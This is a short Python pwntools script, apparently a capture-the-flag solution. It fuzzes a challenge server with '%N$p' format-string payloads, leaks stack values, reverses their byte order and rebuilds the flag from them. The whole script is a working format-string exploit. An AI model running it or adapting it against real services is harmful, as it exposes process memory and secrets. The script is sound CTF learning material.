from pwn import *

# Connect to server
io = remote('chall.server', 1337)

flag = ''

# Let's fuzz x values
for i in range(100):
    try:
        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendlineafter(b':', '%{}$p'.format(i).encode())
        # Receive the response (leaked address followed by '.' in this case)
        result = io.recvuntil(b'.')[:-1]
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up flag
                flag += reversed_hex.decode()
            except BaseException:
                pass
    except EOFError:
        pass

# Print and close
info(flag)
io.close()
